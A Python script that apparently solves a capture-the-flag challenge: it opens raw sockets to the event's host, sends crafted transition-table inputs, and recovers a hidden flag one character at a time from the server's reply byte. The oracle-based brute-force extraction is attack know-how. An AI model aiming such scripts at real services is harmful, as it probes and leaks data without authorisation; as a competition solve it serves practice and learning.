import time
import socket


class Netcat:
    """ Python 'netcat like' module """

    def __init__(self, ip, port):
        self.buff = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((ip, port))

    def read(self, length=1024):
        """ Read 1024 bytes off the socket """
        return self.socket.recv(length)

    def read_until(self, data):
        """ Read data into the buffer until we have data """
        while data not in self.buff:
            self.buff += self.socket.recv(1024).decode("ascii")

        pos = self.buff.find(data)
        rval = self.buff[:pos + len(data)]
        self.buff = self.buff[pos + len(data):]

        return rval

    def write(self, data):
        self.socket.send(data)

    def close(self):
        self.socket.close()


def crafted(f=None, position=None):
    result = ""
    length = 11
    t = ["".join([str(i), ' @ ', str(i+1)]) for i in range(length-1)]
    if f is not None:
        if position is not None:
            t[position] = "".join([str(position), f' ~{f} ', str(position+1)])
        else:
            t = ["".join([str(i), f' ~{f} ', str(i+1)])
                 for i in range(length-1)]

    T = len(t)
    S = len(t) + 1
    f = [S - 1]

    result += str(S) + '\n'
    result += " ".join([str(i) for i in f]) + '\n'
    result += str(T) + '\n'
    for line in t:
        result += line + '\n'
    return result


whitelist = "_acdefhk"
result = ""
for pos in range(11):
    for i in whitelist:
        s = Netcat('dyn.ctf.pearlctf.in', 30018)

        data = bytes(crafted(i, pos), 'ascii')
        s.write(data)
        time.sleep(3)
        buf = s.read()
        buf = s.read()
        print(pos, i, buf[-2])
        if buf[-2] == 46:
            result += i
            break
        s.close()

print(result)
